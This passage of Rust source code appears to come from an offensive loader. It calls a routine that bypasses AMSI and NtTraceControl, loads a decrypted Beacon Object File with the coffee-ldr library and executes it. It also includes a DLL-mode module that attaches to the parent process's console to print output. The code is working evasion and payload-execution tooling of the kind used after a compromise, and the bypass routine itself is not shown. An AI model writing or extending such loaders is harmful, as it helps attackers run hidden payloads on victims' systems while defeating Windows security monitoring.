    // Ensure the bypass setup (AMSI/NtTraceControl) is in place
    setup_bypass()?;
    println!("[+] Bypass setup complete");
    
    // Load and execute the BOF using coffee-ldr
    let coffee = Coffee::new(&decrypted_bof_data)
        .map_err(|e| format!("[!] Failed to load BOF: {:?}", e))?;
    println!("[+] Loaded BOF successfully");
    
    let output = coffee.execute(
        Some(parsed_args.as_ptr()),
        Some(parsed_args.len()),
        None
    ).map_err(|e| format!("[!] BOF execution failed: {}", e))?;
    
    println!("\n{}", output);
    
    Ok(())
}


#[cfg(feature = "dll")]
pub mod dll_specific {
    use super::*;
    use std::sync::Once;

    static INIT: Once = Once::new();
    static mut STDOUT_HANDLE: *mut c_void = INVALID_HANDLE_VALUE as *mut c_void;
    static mut STDERR_HANDLE: *mut c_void = INVALID_HANDLE_VALUE as *mut c_void;

    pub fn write_to_console(handle: *mut c_void, message: &str) {
        unsafe {
            if handle != INVALID_HANDLE_VALUE as *mut c_void {
                let mut written: u32 = 0;
                WriteFile(
                    handle,
                    message.as_ptr() as *const c_void,
                    message.len() as u32,
                    &mut written,
                    std::ptr::null_mut(),
                );
                FlushFileBuffers(handle);
            }
        }
    }

    pub fn init_console() {
        INIT.call_once(|| {
            unsafe {
                if AttachConsole(ATTACH_PARENT_PROCESS) != 0 {
                    STDOUT_HANDLE = GetStdHandle(STD_OUTPUT_HANDLE);
                    STDERR_HANDLE = GetStdHandle(STD_ERROR_HANDLE);
                }
            }
        });
    }

    pub fn get_stdout_handle() -> *mut c_void {
        unsafe { STDOUT_HANDLE }
    }

    pub fn get_stderr_handle() -> *mut c_void {
        unsafe { STDERR_HANDLE }
    }
}
